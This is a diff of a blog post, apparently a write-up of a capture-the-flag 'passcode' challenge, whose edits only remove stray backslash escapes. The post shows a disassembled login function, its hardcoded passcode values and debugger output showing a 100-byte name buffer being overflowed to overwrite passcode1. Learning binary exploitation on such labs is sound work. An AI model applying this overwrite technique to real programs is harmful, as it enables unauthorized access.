@@ -159,17 +159,17 @@ Dump of assembler code for function login:
   0x0804856a <+6>:     mov    eax,0x8048770  
   0x0804856f <+11>:    mov    DWORD PTR [esp],eax  0x08048572 <+14>:    call   0x8048420 <printf@plt>  
   0x08048577 <+19>:    mov    eax,0x8048783  
-  0x0804857c <+24>:    mov    edx,DWORD PTR [ebp\-0x10]  
+  0x0804857c <+24>:    mov    edx,DWORD PTR [ebp-0x10]  
   0x0804857f <+27>:    mov    DWORD PTR [esp+0x4],edx  0x08048583 <+31>:    mov    DWORD PTR [esp],eax  0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>  
   0x0804858b <+39>:    mov    eax,ds:0x804a02c  
   0x08048590 <+44>:    mov    DWORD PTR [esp],eax  0x08048593 <+47>:    call   0x8048430 <fflush@plt>  
   0x08048598 <+52>:    mov    eax,0x8048786  
   0x0804859d <+57>:    mov    DWORD PTR [esp],eax  0x080485a0 <+60>:    call   0x8048420 <printf@plt>  
   0x080485a5 <+65>:    mov    eax,0x8048783  
-  0x080485aa <+70>:    mov    edx,DWORD PTR [ebp\-0xc]  
+  0x080485aa <+70>:    mov    edx,DWORD PTR [ebp-0xc]  
   0x080485ad <+73>:    mov    DWORD PTR [esp+0x4],edx  0x080485b1 <+77>:    mov    DWORD PTR [esp],eax  0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>  
   0x080485b9 <+85>:    mov    DWORD PTR [esp],0x8048799  
-  0x080485c0 <+92>:    call   0x8048450 <puts@plt>  0x080485c5 <+97>:    cmp    DWORD PTR [ebp\-0x10],0x528e6  0x080485cc <+104>:   jne    0x80485f1 <login+141>  0x080485ce <+106>:   cmp    DWORD PTR [ebp\-0xc],0xcc07c9  0x080485d5 <+113>:   jne    0x80485f1 <login+141>  
+  0x080485c0 <+92>:    call   0x8048450 <puts@plt>  0x080485c5 <+97>:    cmp    DWORD PTR [ebp-0x10],0x528e6  0x080485cc <+104>:   jne    0x80485f1 <login+141>  0x080485ce <+106>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9  0x080485d5 <+113>:   jne    0x80485f1 <login+141>  
   0x080485d7 <+115>:   mov    DWORD PTR [esp],0x80487a5  
   0x080485de <+122>:   call   0x8048450 <puts@plt>  
   0x080485e3 <+127>:   mov    DWORD PTR [esp],0x80487af  
@@ -180,7 +180,7 @@ Dump of assembler code for function login:
   0x08048604 <+160>:   call   0x8048480 <exit@plt>
 {% endhighlight %}
 
-Note the line highlighted in red which signifies the beginning of the if statement. The hex value 0x528e6 (338150 in decimal) is compared to ebp\-0x10, thus at this point in memory lies passcode1.  By the same token, the line highlighted in purple represents passcode2 in which 0xcc07c9 (13371337 in decimal) is compared to ebp\-0xc.
+Note the line highlighted in red which signifies the beginning of the if statement. The hex value 0x528e6 (338150 in decimal) is compared to ebp-0x10, thus at this point in memory lies passcode1.  By the same token, the line highlighted in purple represents passcode2 in which 0xcc07c9 (13371337 in decimal) is compared to ebp-0xc.
 
 2.  After setting a breakpoint at login+97 (0x080485c5), the program is run with a username of 101 A’s.
 
@@ -195,17 +195,17 @@ Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 enter passcode1 : enter passcode2 : checking...
 {% endhighlight %}
 
-3.  Now looking at the value located at ebp\-0x10 shows something of interest:
+3.  Now looking at the value located at ebp-0x10 shows something of interest:
 
 {% highlight bash %}
 pwndbg> x/x $ebp-0x10  
 0xffffd008:     0x41414141
 {% endhighlight %}
 
-41 in hex is ‘A’. Therefore, upon passing a large input to the name[100] buffer, the value for passcode1 can be written into. Additionally, observe the value for passcode2 located at ebp\-0xc:
+41 in hex is ‘A’. Therefore, upon passing a large input to the name[100] buffer, the value for passcode1 can be written into. Additionally, observe the value for passcode2 located at ebp-0xc:
 
 {% highlight bash %}
-pwndbg> x/x $ebp\-0xc  
+pwndbg> x/x $ebp-0xc  
 0xffffd00c:     0x2b959b00
 {% endhighlight %}
 
@@ -307,12 +307,12 @@ enter you name : Welcome AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 Breakpoint 1, 0x080485a0 in login ()                                                                      
 LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA  
 ───────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]───────────────────────────────────────────────────────────────────────────────────────────────────  
-EAX  0x8048786 ◂\-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */  
+EAX  0x8048786 ◂-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */  
 EBX  0x0                                            
 ECX  0x0                                                                                                  
 EDX  0xffffffff                                      
-EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂\-- 0x1e4d6c  
-ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂\-- 0x1e4d6c                                                    EBP  0xffffd038 \--▸ 0xffffd058 ◂-- 0x0      ESP  0xffffd010 \--▸ 0x8048786 ◂-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */EIP  0x80485a0 (login+60) \--▸ 0xfffe7be8 ◂-- 0x0                                                            
+EDI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂-- 0x1e4d6c  
+ESI  0xf7faf000 (_GLOBAL_OFFSET_TABLE_) ◂-- 0x1e4d6c                                                    EBP  0xffffd038 --▸ 0xffffd058 ◂-- 0x0      ESP  0xffffd010 --▸ 0x8048786 ◂-- outsb  dx, byte ptr gs:[esi] /* 'enter passcode2 : ' */EIP  0x80485a0 (login+60) --▸ 0xfffe7be8 ◂-- 0x0                                                            
 ───────────────────────────────────────────────[ DISASM ]────────────────────────────────────────────────  
 ► 0x80485a0 <login+60>     call   printf@plt <printf@plt>
 {% endhighlight %}
